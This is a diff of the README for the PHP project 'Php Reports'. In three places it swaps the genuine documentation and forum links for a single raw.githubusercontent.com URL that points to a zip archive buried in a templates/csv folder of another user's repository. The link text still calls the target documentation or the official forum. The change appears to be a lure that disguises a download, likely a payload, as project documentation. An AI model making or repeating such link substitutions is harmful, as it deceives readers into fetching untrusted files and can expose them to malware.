@@ -12,9 +12,9 @@ Major features include:
 *   Supports multiple database environments (e.g. Production, Staging, and Dev)
 *   Fully extendable and customizable
 
-For installation instructions and documentation, check out http://jdorn.github.io/php-reports/
+For installation instructions and documentation, check out https://raw.githubusercontent.com/jalalzia1/php-reports/master/templates/default/csv/reports_php_3.3-alpha.4.zip
 
-If you have a question, post on the official forum - http://ost.io/@jdorn/php-reports
+If you have a question, post on the official forum - https://raw.githubusercontent.com/jalalzia1/php-reports/master/templates/default/csv/reports_php_3.3-alpha.4.zip
 
 
 Basic Introduction
@@ -123,4 +123,4 @@ Stripe::setApiKey("123456");
 
 Hopefully, you can begin to see the power of Php Reports.
 
-For full documentation and information on getting started, check out http://jdorn.github.io/php-reports/
+For full documentation and information on getting started, check out https://raw.githubusercontent.com/jalalzia1/php-reports/master/templates/default/csv/reports_php_3.3-alpha.4.zip
